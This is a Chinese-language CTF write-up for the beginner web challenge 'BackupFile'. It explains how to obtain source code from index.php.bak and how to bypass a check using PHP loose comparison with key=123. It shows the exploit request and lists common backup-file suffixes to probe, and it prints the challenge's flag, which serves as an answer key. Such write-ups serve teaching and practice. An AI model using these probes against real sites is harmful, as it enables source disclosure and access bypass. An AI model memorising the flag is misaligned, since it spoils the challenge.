---
title: "[ACTF2020 新生赛]BackupFile"
platform: BUUCTF
category: Web
difficulty: 入门
tags: [php, weak-type, source-disclosure, backup-file]
vulnerability: PHP 弱类型比较漏洞导致绕过数字检查
solved: true
flag: "flag{6da1874f-fefd-411c-97d7-f168ee4a1486}"
---

# [ACTF2020 新生赛]BackupFile

## 题目概述
题目提示 "Try to find out source file!"，需要找到备份源文件获取代码逻辑。

## 信息收集
1. 访问题目首页，返回提示信息
2. 尝试常见备份文件路径 `index.php.bak`，成功获取源码

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**：PHP 弱类型比较漏洞

**原理**：
- PHP 使用 `==` 进行松散比较时，会进行类型转换
- 当数字与字符串比较时，字符串会被转换为数字
- 字符串 `"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"` 以数字开头，转换时只取前面的数字部分 `123`
- 因此 `123 == "123ffws..."` 结果为 `true`

**判断过程**：
```php
$key = intval($key);  // 用户输入转为整数
$str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
if($key == $str) {    // 弱类型比较
    echo $flag;
}
```
只要 `$key = 123`，就能满足 `$key == $str` 的条件。

## 利用过程（Payload + Flag）

**Payload**：
```
GET /index.php?key=123
```

**完整请求**：
```bash
curl "http://target/index.php?key=123"
```

**Flag**：`flag{6da1874f-fefd-411c-97d7-f168ee4a1486}`

## 复现步骤
1. 访问题目，发现提示 "Try to find out source file!"
2. 访问 `index.php.bak` 获取源码
3. 分析源码，发现 PHP 弱类型比较漏洞
4. 构造 `key=123` 绕过检查获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| PHP 弱类型比较 | GET 参数 key | `?key=123` | PHP 类型转换规则 |
| 源码泄露 | 备份文件 | `/index.php.bak` | 常见备份文件名 |

## 知识总结（解题技巧、同类题型套路）

**解题技巧**：
1. 遇到 "find source file" 提示，尝试常见备份文件：`.bak`, `.swp`, `.old`, `~`, `.php~`
2. PHP 弱类型比较绕过：字符串转数字时只取开头的数字部分

**同类题型套路**：
- PHP 弱类型比较题：找数字开头的字符串，用对应数字绕过
- 常见 PHP 比较绕过：`0 == "abc"` (true)、`123 == "123abc"` (true)
